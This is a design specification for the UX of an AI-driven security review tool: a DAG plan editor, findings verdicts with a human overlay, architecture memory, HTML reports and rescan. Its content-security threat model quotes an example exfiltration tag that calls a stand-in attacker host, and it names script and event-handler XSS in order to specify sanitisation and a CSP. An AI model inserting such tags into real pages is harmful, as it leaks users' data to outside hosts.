# Part 13: Security UX v2

*Depends on: Parts 00-12. Conformance: L3.*

## Purpose

Part 13 ships seven UX improvements and two supporting concepts based on user feedback from onboarding walkthroughs. This part supersedes specific sections of Parts 08 and 09 while preserving their underlying contracts.

The changes are:

1. Preset label rename: "Full code review" becomes "Basic code review" to signal starting-point configuration, not exhaustive coverage.
2. Focus and invariants move under an Advanced disclosure on Step 1. Personas treat them as attention guidance, never as scope filters.
3. The plan editor renders as a directed acyclic graph with per-node edit drawer, replacing the linear list view.
4. Running view rebalances: findings pane widens to 60% default, activity stream becomes a read-only rail under the DAG.
5. Findings model adds three verdict types and a non-destructive human overlay. Fingerprints stay stable across overlay edits.
6. Report publishes as a rich HTML artifact with per-finding visualization generation on demand.
7. Rescan prefills the parent engagement's final plan in an editable DAG view before start.

Supporting concepts: architecture memory stored as `/architecture.yml` in the engagement tree, and cell-level finding-to-stream cross-links.

## Supersession table

Part 13 replaces the following normative sections. Old text stays for the history of the source-only ship path.

| Superseded | Old normative content | v2 replacement |
|---|---|---|
| Part 08 §3.2 (Step 1: Focus) | Focus, invariants, and categories fields visible by default. | Focus and invariants move under an Advanced disclosure. Categories stay visible. |
| Part 08 §3.3 (Step 2: Plan) | Plan renders as a linear list with inline controls. | Plan renders as a DAG. Nodes show minimal chrome. Per-node edit drawer holds all existing controls. |
| Part 08 §4.1 (Running view layout) | Left column: header, review summary, cell rail. Right column: findings, coverage, report. | Left column (40%): DAG at top, read-only activity stream below. Right column (60%): findings, coverage, report. Draggable divider. |
| Part 08 §4.6 (Report as markdown) | Report cell writes markdown and JSON. Terminal view renders markdown. | Report cell also publishes one HTML artifact (`kind: "security-report"`). Markdown and JSON downloads stay. |
| Part 09 §2.1 (Launch checklist) | Third wizard step is the Launch checklist. | Unchanged for launch semantics. Checklist gains one line naming which fields are set under Advanced. |
| Part 08 §6.4 (Flow D: Re-scan) | Rescan seeds a new engagement and starts immediately. | Rescan opens the DAG editor prefilled with parent's final plan. Start is a second click. |

## §13.1 Preset rename

The preset with id `code-review` MUST use label "Basic code review". This is a label change only. The preset id, the `isKnownPreset` check, and the `security_engagements.preset` value do NOT change.

**Touch points (normative):**

- `SECURITY_PRESETS[0].label` in `packages/web/src/routes/security.index.tsx` MUST be "Basic code review".
- The preset row in `packages/plugin-security/src/lib/presets.ts` MUST match.

**Hint text (normative):**

Every preset card on the setup wizard's preset-selection view MUST display this line: "Starting point. Reconfigure the plan on the next step."

The hint text signals that presets are seed configurations, not final choices. A user who picks a preset and proceeds to Step 2 MUST see the plan editor populated with the preset's cells. The user MAY edit that plan.

## §13.2 Focus and invariants under Advanced

**UI visibility (normative):**

The wizard's Step 1 view MUST place the `focus` and `invariants` input fields under an "Advanced" disclosure widget. The disclosure MUST be collapsed by default. The `categories` field MUST remain visible outside the disclosure.

The model-picker control MUST remain visible outside the disclosure.

**Persona interpretation (normative):**

Every persona role markdown in `packages/plugin-security/personas/*.md` MUST include this guidance:

> Focus and invariants are attention hints. Do not narrow the assessed surface based on non-empty focus. Invariants are hypotheses to check, not assertions to skip.

A persona that receives a non-empty `focus` MUST read it as a request to spend extra attention on the named areas. The persona MUST NOT exclude files, functions, or modules from assessment solely because they are not mentioned in `focus`.

A persona that receives a non-empty `invariants` list MUST read each invariant as a hypothesis to verify. The persona MUST NOT assume an invariant is true without checking evidence. The persona MUST report a finding if evidence contradicts an invariant.

**Test vector (normative):**

For a fixed corpus repository, a security engagement run with non-empty `focus` and non-empty `invariants` MUST produce a coverage ledger where the assessed-surface count is greater than or equal to the assessed-surface count of a matched run with both `focus` and `invariants` empty. All other configuration MUST be identical between the two runs.

If the assessed-surface count decreases when `focus` or `invariants` are non-empty, the persona narrowed its scope. This is a conformance failure.

Appendix D MUST include one test vector demonstrating this requirement.

**Launch checklist addition (normative):**

The Launch checklist view (Part 09 §2.1) MUST add one line:

```
Focus and invariants set under Advanced: <yes | no>
```

The `yes` value appears when the user set at least one of `focus` or `invariants` to a non-empty value. The `no` value appears when both are empty or unset.

## §13.3 Plan editor as DAG

The plan editor MUST render the `PlanCell[]` array as a directed acyclic graph. The underlying `parsePlan` and `serializePlan` functions from Part 08 §3.3 do NOT change. The DAG is a view over the ordered list.

**Rendering rules (normative):**

- One node per cell. Node chrome MUST show: cell ordinal, persona name, goal text (truncated to 60 characters with ellipsis if longer), and persona deterministic flag as a "D" chip when applicable.
- Node chrome MUST show a badge for cells with `triad: true`, `review: true`, or `mode: "post-pivot-delta"`.
- One edge per entry in the cell's `reads` array. An edge MUST connect from the earlier ordinal to the later ordinal.
- Layout MUST be left-to-right. Cells at depth 0 (no dependencies) appear in the leftmost column. Cells with the same depth appear in the same column.
- Sibling cells (same depth, same parent in the reads chain) MAY appear in parallel rows within their column.

**Editor rules (normative):**

- Add node: the user clicks "Add node" and selects a parent node. The new node's default `reads` array contains one element: the parent node's ordinal.
- Delete node: deleting a node MUST prompt the user to remap or delete every descendant node whose `reads` array includes the deleted node's ordinal.
- Backward edges: the editor MUST refuse to create an edge from ordinal N to ordinal M where M < N. The editor MUST refuse to create a cycle.
- Reordering: when the user saves the plan, the editor MUST rewrite cell ordinals so that every cell's `reads` array contains only ordinals less than the cell's own ordinal.
- Per-node edit drawer: clicking a node MUST open a right-side drawer. The drawer MUST display every control from Part 08 §3.3: persona dropdown, playbook text input, mode dropdown, reads multi-checkbox, triad checkbox, review checkbox, paths text area.

**Validation (normative):**

The DAG editor MUST enforce every validation rule from Part 08 §3.3:

- `MAX_STEPS = 32`. The editor MUST refuse to add a 33rd node.
- Every cell with `mode: "post-pivot-delta"` MUST have a `reads` array with exactly one element. That element MUST be a cell with ordinal less than the current cell's ordinal.
- Every cell MUST have a non-empty `goal` string.
- Every cell whose persona id is in `LIVE_PERSONAS` MUST have at least one host in the engagement's `authorizedScope`.

**Round-trip requirement (normative, test vector):**

For every plan `P` that the Part 08 §3.3 linear editor accepts, the following MUST hold:

```
parsePlan(serializePlan(edit(parsePlan(P)))) === parsePlan(P)
```

where `edit` is any sequence of add-node, delete-node, or reorder operations that produces a valid plan.

Appendix D MUST include a vitest snapshot suite that seeds the DAG editor with every bundled preset, performs a no-op edit (open and save with no changes), and asserts the serialized YAML matches the seed.

**Layout library (indicative):**

dagre is the RECOMMENDED layout engine for cell count <= 32. elkjs is an acceptable alternative.

## §13.4 Running-view layout

**Layout (normative):**

The running engagement view MUST divide the viewport into two columns:

- Left column (40% default width): DAG at top, activity stream below.
- Right column (60% default width): findings pane (list and detail), coverage tab, report tab.

The divider between columns MUST be draggable. The divider position MUST persist in the browser's `localStorage` keyed by engagement id.

**Activity stream (normative):**

The activity stream is read-only. The stream MUST NOT display a text input field for user messages. A future part MAY add user input.

**Node state on DAG (normative):**

Each node in the DAG MUST display the cell's current `status` value. The mapping is:

- `pending`: gray fill.
- `running`: blue fill with pulse animation.
- `completed`: green fill.
- `yielded`: yellow fill.
- `failed`: red fill.

A node with `status: "running"` MUST pulse. The pulse animation MUST repeat every 1.5 seconds.

**Finding to stream cross-link (normative):**

The cross-link operates at cell granularity. `security_findings.cellId` is the join key.

When the user clicks a finding in the findings pane, the UI MUST scroll the activity stream to the first entry where `engine_entries.metadata.cellId` matches the finding's `cellId`. The UI MUST highlight that entry for 2 seconds.

When the user clicks an entry in the activity stream, the UI MUST filter the findings list to show only findings where `security_findings.cellId` matches the entry's `cellId`.

Turn-level cross-linking (joining on `engine_entries.id` or a new `security_findings.originEntryId` column) is deferred to Part 14.

## §13.5 Findings model v2

**New status set (normative):**

The `security_findings.status` column MUST accept these values:

```
verified_agree | verified_disagree | refuted | fixed | untriaged
```

Definitions:

- `verified_agree`: the persona verified the finding and the human reviewer concurs.
- `verified_disagree`: the persona verified the finding but the human reviewer interprets it differently. The verdict itself is real. The interpretation is disputed.
- `refuted`: the finding is not real. The persona reported a false positive.
- `fixed`: the finding was real and has been resolved. Used by rescan carry-over.
- `untriaged`: no human action yet. This is the default for new findings.

The old `verified` status value from Part 08 is DEPRECATED. Existing rows with `status = "verified"` MUST be treated as `verified_agree` by the UI until a human reviewer touches the finding.

**Schema changes (normative):**

- The CHECK constraint on `security_findings.status` in `packages/api/migrations/pg/0000_app.sql` MUST widen to accept all five values.
- A `SCHEMA_REPAIRS` entry in `packages/api/src/lib/drizzle.ts` MUST add the new constraint check.

**Human overlay (normative):**

New columns on `security_findings`:

```sql
ALTER TABLE security_findings
  ADD COLUMN human_severity TEXT NULL,
  ADD COLUMN human_title TEXT NULL,
  ADD COLUMN human_body TEXT NULL,
  ADD COLUMN human_edited_at TIMESTAMPTZ NULL,
  ADD COLUMN human_edited_by TEXT NULL;
```

The human overlay is non-destructive. When a human edits severity, title, or body, the edit writes to the `human_*` columns. The model-authored `severity`, `title`, and `body` columns MUST NOT change.

**Fingerprint stability (INV-14, normative):**

The fingerprint function from Part 02 §2.1 MUST compute over the model-authored `title` and `body` columns. The fingerprint function MUST NOT include `human_title`, `human_body`, or `human_severity` in its input.

A rescan engagement's `reconcile` persona MUST match findings by model-authored fingerprint. The reconcile persona MUST use the fingerprint computed from the model-authored fields, not from the human overlay.

**Rendering rule (normative):**

The finding detail pane MUST render `human_title` when it is non-null, otherwise `title`. The pane MUST render `human_body` when it is non-null, otherwise `body`. The pane MUST render `human_severity` when it is non-null, otherwise `severity`.

When the UI renders a human overlay field, the UI SHOULD display a visual indicator (icon or color) that the value is human-edited.

**Export rule (normative):**

Markdown, SARIF, and JSON export functions MUST prefer human overlay fields when present. The export MUST include a footnote citing the model-authored value. The footnote format is:

```
[model: <model-authored value>]
```

**Keyboard contract (normative):**

The finding detail pane MUST support these keyboard shortcuts:

- `v`: opens a verdict picker popover. The popover MUST display two options: "Agree" (keystroke `a`) and "Disagree" (keystroke `d`). The popover MUST auto-focus so the user can type `a` or `d` without a second focus action.
- `r`: opens a refute dialog. The dialog MUST prompt for a reason. Submitting the dialog sets `status = "refuted"` and writes the reason to `statusReason`.

The fastest path to verify-agree is `v` then `a` (two keystrokes). This MUST NOT regress from the Part 08 single-keystroke `v` for verify.

**Reasoning storage (normative):**

New column on `security_findings`:

```sql
ALTER TABLE security_findings
  ADD COLUMN reasoning TEXT NULL;
```

The `reasoning` column stores the persona's rationale for emitting the finding. The value MUST be capped at 2000 codepoints. Values longer than 2000 codepoints MUST be truncated at write time.

The finding detail pane MUST display the `reasoning` value when it is non-null. The UI SHOULD label the section "Persona reasoning" or "Rationale".

**Persona prompt addition (normative):**

Every persona role markdown in `packages/plugin-security/personas/*.md` MUST include this guidance:

> When you emit a finding, populate the `reasoning` field with the smallest set of citations and inferences a human reviewer needs to follow your logic. Cap reasoning at 2000 codepoints.

## §13.6 Architecture memory

**Storage (normative):**

Architecture memory is stored at virtual path `/architecture.yml` in the engagement tree. The file is addressed via `sec_fs_read` and `sec_fs_write` engine tools. No new Postgres table is required.

**Schema (normative):**

The `/architecture.yml` file MUST conform to this YAML schema:

```yaml
version: 1
authored_by: <persona-id or "human">
last_edited_at: <ISO 8601 timestamp>
components:
  - id: <string>
    kind: service | datastore | library | external
    language: <string or null>
    entrypoints:
      - <file path>
    trusts:
      - <component id>
trust_boundaries:
  - from: <component id or "internet">
    to: <component id>
    controls:
      - <string>
notes: <free-form text>
```

**Flow (normative):**

1. The `recon` persona MUST populate `/architecture.yml` on its first run. The `recon` persona role markdown MUST include this instruction:

   > Populate `/architecture.yml` on first run. Follow the schema at Part 13 §13.6.

2. Every cell with ordinal > 0 (cells after `recon`) MUST read `/architecture.yml` before emitting findings. A new boolean field `reads_arch` on `PlanCell` controls this behavior. The default value is `true` for all non-recon cells. The default value is `false` for the recon cell.

3. The running view MUST render an architecture diagram under the coverage tab. The diagram is a visualization of the `/architecture.yml` schema. The UI MUST display an "Edit" button next to the diagram.

4. When a human edits `/architecture.yml`, the write MUST stamp `authored_by: "human"` and `last_edited_at: <current ISO 8601 timestamp>`.

**Boundary (INV-15, normative):**

Architecture memory is a claim, not evidence. A persona that cites `/architecture.yml` in a finding's `reasoning` field MUST also cite file evidence (a file path and line range from `sec_fs_read` or a tool output referencing a file).

Part 07's anti-cap checks are authoritative for finding validity. A finding that cites only `/architecture.yml` without file evidence MUST be rejected at the anti-cap check in `sec_cell_complete`.

**Diagram rendering (indicative):**

Mermaid is the RECOMMENDED format for the architecture diagram. The UI MAY render the diagram inline or as a downloadable SVG.

## §13.7 Report as HTML artifact

**New artifact kind (normative):**

The report cell MUST publish one HTML artifact with `kind = "security-report"`. The existing markdown and JSON downloads from Part 08 §4.6 MUST remain available.

**Report structure (normative):**

The HTML artifact MUST include these sections in order:

1. Executive summary at the top.
2. Findings grouped first by severity (critical, high, medium, low, info), then by `cellId` within each severity group.
3. For each finding: model-authored title (or human overlay if present), model-authored body (or human overlay if present), reasoning (if non-null), evidence excerpt, file and line links back to the source.
4. Optional attack-flow diagram per multi-cell finding. The diagram MUST be embedded as SVG or a mermaid block rendered at publish time.
5. Coverage summary: assessed surface count vs NOT_ASSESSED count, grouped by area.
6. Pivot round summary if the engagement executed a pivot coordinator cell. The summary MUST list the needs surfaced, the needs resolved (auto vs human), and the delta targets computed.

**Per-finding visualization button (normative):**

The finding detail pane MUST display a "Generate visualization" button for each finding. When the user clicks the button, the UI MUST enqueue a work item that:

1. Calls the model with the finding's context (title, body, reasoning, evidence).
2. Requests one embedded visualization: a mermaid diagram (attack chain), ASCII-art data-flow, or an annotated code snippet.
3. Stores the result inline on the finding row (new column `security_findings.visualization TEXT NULL`).
4. Re-publishes the HTML artifact with the updated finding visualization.

The button MUST generate one visualization at a time, not batch. The user MUST click the button separately for each finding they want visualized.

**Artifact wire (normative):**

`POST /api/artifacts/share` MUST accept `kind: "security-report"`. The request payload MUST include the engagement id. The artifact row MUST snapshot the HTML at publish time. A later change to the engagement (new finding, edited overlay, generated visualization) MUST NOT rewrite an already-published artifact. The persona MUST call a new `sec_report_publish_html` engine tool to publish.

The existing `orgs.allow_public_artifacts` gate MUST apply to security-report artifacts.

A rescan engagement MUST NOT touch parent-report artifacts. Each engagement publishes its own artifact.

**Content security (INV-16, normative, threat model):**

Model-authored HTML is untrusted content. Threats:

- Stored XSS via a finding title that contains `<script>` or event handlers.
- Exfiltration via an `<img src="https://attacker.com/exfil?data=...">` tag.
- Clipboard hijack via a malicious inline event handler.

Mitigations:

- The `sec_report_publish_html` tool MUST strip every `<script>` tag, every `<style>` tag, every event handler attribute (`onclick`, `onload`, etc.), and every URL that points outside the organization's domain.
- Visualizations MUST render as inline SVG only. External `<img>` tags are prohibited.
- The artifact route `GET /api/artifacts/:token` MUST set this Content-Security-Policy header before serving HTML artifacts:

  ```
  default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; script-src 'none'
  ```

This CSP is a prerequisite. HTML artifacts MUST NOT ship until the CSP enforcement is in place.

**Persona prompt addition (normative):**

The `report.md` persona role markdown MUST include this instruction:

> Publish the HTML artifact via the `sec_report_publish_html` engine tool. Cite the artifact id in the report markdown.

## §13.8 Rescan v2

**Flow (normative):**

1. From a terminal engagement row, the user clicks "Rescan".
2. The `/security/new` route opens with `rescanOf: <parent engagement id>` in the URL query string.
3. The wizard calls `POST /security/preview` with `rescanOf: <parent engagement id>` in the request body. The preview endpoint MUST return the parent engagement's final `planCells` array, `config` object, `authorizedScope` array, `focus` string, `invariants` array, and `categories` array.
4. The wizard skips Step 1 (Focus) and opens directly to Step 2 (Plan). The user MAY navigate back to Step 1 via a "Back" button.
5. The DAG editor prefills with the parent's `planCells`. The user MAY add nodes, remove nodes, or reorder nodes. Delete operations MUST cascade (see §13.3).
6. The DAG editor MUST render a "carry-forward" chip on any node whose `reads` chain touches a `reconcile` cell. The chip signals that the node will inherit findings from the parent engagement.
7. The user clicks "Start". The wizard calls `POST /api/sessions` with the edited `planCells` and `rescanOf: <parent engagement id>`.

**Reconcile behavior (normative):**

If the user removes the `reconcile` cell from the DAG, the rescan behaves as a fresh scan seeded from the parent's configuration. The wizard MUST display this warning banner when no `reconcile` cell is present:

```
Rescan without a reconcile cell will not carry parent findings.
```

**Pivot carry-over (normative):**

The preview endpoint MUST prefill the `pivot-coordinator` cell if it is present in the parent's plan. The parent's pivot needs answers (stored in `human_response.yml`) are NOT carried forward. The user MUST re-provide answers if the coordinator yields a `needs_human` round.

The DAG editor MUST render a chip on the `pivot-coordinator` node with this text:

```
Reruns pivot. Parent needs answers NOT carried.
```

**Wire changes (normative):**

- `POST /security/preview` accepts an optional `rescanOf` field (engagement id string).
- When `rescanOf` is present, the response MUST include `planCells`, `config`, `authorizedScope`, `focus`, `invariants`, and `categories` from the parent engagement.
- `POST /api/sessions` already accepts `rescanOf` from Part 08 §6.4. No change required.

## §13.9 Cross-cutting schema changes

This table lists every schema change Part 13 requires. Every change MUST follow CLAUDE.md's pre-1.0 rule: edit `0000_app.sql` in place and add a matching `SCHEMA_REPAIRS` entry in `packages/api/src/lib/drizzle.ts`.

| Change | Table | Column | Nullable | Migration path |
|---|---|---|---|---|
| Human overlay: severity | `security_findings` | `human_severity` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Human overlay: title | `security_findings` | `human_title` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Human overlay: body | `security_findings` | `human_body` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Human overlay: audit timestamp | `security_findings` | `human_edited_at` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Human overlay: audit actor | `security_findings` | `human_edited_by` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Reasoning | `security_findings` | `reasoning` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Visualization | `security_findings` | `visualization` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |
| Status enum widen | `security_findings` | `status` (CHECK constraint) | no | 0000_app.sql edit + SCHEMA_REPAIRS |
| Report artifact link | `security_engagements` | `report_artifact_id` | yes | 0000_app.sql edit + SCHEMA_REPAIRS |

`human_severity`, `human_title`, `human_body`, `reasoning`, and `visualization` are TEXT columns.

`human_edited_at` is a TIMESTAMPTZ column.

`human_edited_by` is a TEXT column (user id or session id).

`report_artifact_id` is a TEXT column (foreign key to `artifacts.id`).

The CHECK constraint on `security_findings.status` MUST accept: `verified_agree`, `verified_disagree`, `refuted`, `fixed`, `untriaged`. For backward compatibility, the constraint MAY also accept `verified` (treated as `verified_agree` by the UI).

## §13.10 Persona prompt changes

Every persona role markdown file in `packages/plugin-security/personas/*.md` MUST include these additions:

**1. Focus and invariants treatment:**

> Focus and invariants are attention hints. Do not narrow the assessed surface based on non-empty focus. Invariants are hypotheses to check, not assertions to skip.

**2. Reasoning field:**

> When you emit a finding, populate the `reasoning` field with the smallest set of citations and inferences a human reviewer needs to follow your logic. Cap reasoning at 2000 codepoints.

**3. Recon-specific addition:**

The `recon.md` file MUST add:

> Populate `/architecture.yml` on first run. Follow the schema at Part 13 §13.6.

**4. Report-specific addition:**

The `report.md` file MUST add:

> Publish the HTML artifact via the `sec_report_publish_html` engine tool. Cite the artifact id in the report markdown.

## §13.11 New engine tools

These tools extend the `security-tools.ts` inventory. Tool definitions MUST follow Part 03's `ToolDef` schema. Tools MUST be attached in `buildSecurityRunnerTools` or `buildSecurityPersonaTools` as appropriate.

**`sec_report_publish_html` (indicative):**

Inputs: HTML string (TEXT), engagement id (TEXT). Outputs: artifact id (TEXT).

The tool MUST sanitize the HTML per INV-16 (strip `<script>`, `<style>`, event handlers, external URLs). The tool MUST insert one row into the `artifacts` table with `kind = "security-report"`. The tool MUST snapshot the HTML at publish time.

**`sec_arch_read` and `sec_arch_write` (indicative):**

Wrappers around `sec_fs_read` and `sec_fs_write` for the `/architecture.yml` path. `sec_arch_write` MUST validate the YAML against the schema from §13.6. The tool MUST reject writes that fail schema validation.

**`sec_finding_edit_overlay` (indicative):**

Inputs: finding id (TEXT), optional human_severity (TEXT), optional human_title (TEXT), optional human_body (TEXT), human_edited_by (TEXT).

Outputs: success boolean.

The tool MUST write to `security_findings` human overlay columns. The tool MUST set `human_edited_at` to the current timestamp. The tool is distinct from `sec_finding_review` (which flips `status`).

**`sec_finding_viz_generate` (indicative):**

Inputs: finding id (TEXT).

Outputs: visualization (TEXT), artifact id (TEXT).

The tool MUST call the model with the finding's context (title, body, reasoning, evidence). The tool MUST request one embedded visualization (mermaid diagram, ASCII-art data-flow, or annotated snippet). The tool MUST store the result in `security_findings.visualization`. The tool MUST re-publish the HTML artifact via `sec_report_publish_html`. The tool MUST return the new artifact id.

## §13.12 Test vectors

Appendix D MUST include these test vectors:

**1. Editor round-trip (normative):**

For every preset in `SECURITY_PRESETS`, the test MUST:

1. Seed the DAG editor with the preset's `planCells`.
2. Perform a no-op edit (open the editor, make no changes, save).
3. Serialize the plan via `serializePlan`.
4. Assert the serialized YAML matches the seed verbatim.

The test MUST use vitest snapshots.

**2. Fingerprint stability (normative):**

Given a finding row with model-authored `title` and `body`, the test MUST:

1. Compute fingerprint F1 = fingerprint(title, body).
2. Write `human_title` and `human_body` to the row.
3. Compute fingerprint F2 = fingerprint(title, body) using the same model-authored fields.
4. Assert F1 === F2.

**3. Focus coverage regression (normative):**

Given a fixed corpus repository, the test MUST:

1. Run an engagement with `focus: ""` and `invariants: []`.
2. Record the assessed-surface count from the coverage ledger.
3. Run a second engagement with non-empty `focus` and non-empty `invariants`. All other configuration MUST be identical.
4. Record the assessed-surface count from the second coverage ledger.
5. Assert assessed-surface count (focus set) >= assessed-surface count (focus unset).

**4. Status widen migration (normative):**

Given an existing finding row with `status = "verified"` (Part 08 value), the test MUST:

1. Load the finding in the UI.
2. Assert the UI renders the status as "Agree" (the `verified_agree` display label).
3. Open the finding detail pane.
4. Assert the verdict picker displays "Agree" as selected.

**5. Rescan prefill (normative):**

Given a terminal engagement E1, the test MUST:

1. Call `POST /security/preview` with `rescanOf: E1.id`.
2. Assert the response includes `planCells`, `config`, `authorizedScope`, `focus`, `invariants`, and `categories` fields.
3. Assert the `planCells` array matches E1's final `security_engagements.plan` verbatim.

## §13.13 Open questions closed

These decisions close open questions from the plan doc:

**1. CSP for HTML artifacts:**

`GET /api/artifacts/:token` MUST set the CSP header from INV-16 before serving HTML artifacts. This is a prerequisite. HTML artifacts MUST NOT ship until the CSP enforcement is in place.

**2. Status widen migration:**

Existing `verified` rows MUST be treated as `verified_agree` by the UI until a human reviewer touches the finding. No data rewrite is required at migration time.

**3. Keyboard binding:**

The `v` keystroke opens a verdict picker popover. The popover offers two options: "Agree" (`a` keystroke) and "Disagree" (`d` keystroke). The fastest path to verify-agree is `v` then `a` (two keystrokes total).

**4. DAG library:**

dagre is RECOMMENDED for engagements with `MAX_STEPS = 32`. elkjs is an acceptable alternative.

**5. Architecture diagram:**

The architecture memory diagram MUST render as inline mermaid. This is consistent with the HTML artifact's diagram format.

**6. Reasoning cap:**

The `reasoning` column MUST cap at 2000 codepoints per finding. Values longer than 2000 codepoints MUST be truncated at write time.

**7. Pivot prefill:**

The rescan preview endpoint MUST prefill the `pivot-coordinator` cell if present in the parent's plan. The DAG editor MUST display a chip on that cell: "Reruns pivot. Parent needs answers NOT carried."

**8. Cross-link granularity:**

Cell-level cross-linking ships in Part 13. Turn-level cross-linking (joining on `engine_entries.id` or a new `security_findings.originEntryId` column) is deferred to Part 14.

## Non-goals

- **Meridian handoff.** Valet owns findings and verdicts. The "Send to Meridian" button for accept, mitigate, or remediate workflows is deferred.
- **Batch visualization generation.** The "Generate visualization" button operates on one finding at a time. Batch generation is deferred.
- **New personas.** The twelve bundled personas stay as-is. No additions in Part 13.
- **Cross-engagement architecture memory reuse.** Architecture memory is per-engagement. An org-scoped `/architecture.yml` seeded from prior engagements is deferred.
- **User chat input into running engagement.** The activity stream is read-only in Part 13. User input is deferred to Part 14.
- **Turn-level finding-to-stream cross-link.** Cell-level cross-linking ships now. Turn-level cross-linking (requires `security_findings.originEntryId` column) is deferred to Part 14.
- **Report export to PDF.** HTML artifact ships as HTML only. PDF export is deferred.
- **Multi-round pivots.** Appendix C (Part 00 non-goals) already defers multi-round pivots.

## Implementation checklist

This checklist is indicative, not normative. It drives follow-up PRs.

1. **Schema.** Add columns per §13.9 table. Update `0000_app.sql` and `SCHEMA_REPAIRS`. Run `make dev-clean` in every dev worktree after schema edits.
2. **Preset rename.** Edit `SECURITY_PRESETS[0].label` in `packages/web/src/routes/security.index.tsx` and the matching row in `packages/plugin-security/src/lib/presets.ts`. Add hint text to every preset card.
3. **Advanced disclosure.** Move `focus` and `invariants` inputs under an "Advanced" disclosure on Step 1. Keep `categories` and model picker visible.
4. **Persona prompts.** Edit every file in `packages/plugin-security/personas/` per §13.10.
5. **DAG editor.** Implement rendering and editing per §13.3. Use dagre for layout. Wire per-node edit drawer. Enforce validation rules. Add round-trip vitest suite.
6. **Running view.** Rebalance layout per §13.4. Left column: DAG + stream. Right column: findings + coverage + report. Draggable divider, persist in localStorage.
7. **Findings status widen.** Extend status CHECK constraint. Update `STATUS_OPTIONS` and `FindingStatusChip`. Wire verdict picker popover with `v`, `a`, `d` keyboard shortcuts.
8. **Human overlay.** Add schema columns per §13.9. Wire `sec_finding_edit_overlay` tool. Update finding detail pane to render overlay when present. Update export functions to prefer overlay and cite model-authored value.
9. **Reasoning.** Add schema column per §13.9. Update persona prompts to populate `reasoning`. Display reasoning in finding detail pane.
10. **Architecture memory.** Implement `/architecture.yml` schema. Wire `sec_arch_read` and `sec_arch_write`. Update `recon.md` prompt. Render diagram under coverage tab with Edit button.
11. **HTML artifact.** Implement `sec_report_publish_html` tool with INV-16 sanitization. Update `report.md` prompt. Wire artifact publish route. Verify CSP enforcement on `GET /api/artifacts/:token`.
12. **Per-finding viz.** Add "Generate visualization" button to finding detail pane. Wire `sec_finding_viz_generate` tool. Store result in `security_findings.visualization`. Re-publish HTML artifact on generation.
13. **Rescan v2.** Extend `POST /security/preview` to accept `rescanOf` and return parent plan. Seed DAG editor with parent plan. Wire "carry-forward" chip on nodes touching `reconcile`. Display warning banner when `reconcile` is absent.
14. **Cross-link.** Wire finding-to-stream scroll and highlight. Wire stream-to-findings filter. Use `security_findings.cellId` as join key.
15. **Test vectors.** Add five vectors per §13.12 to Appendix D.
16. **Launch checklist.** Add "Focus and invariants set under Advanced: yes/no" line to checklist view.

Every step MUST close at least one INV or fulfill one normative MUST. Every INV MUST have at least one checklist step.
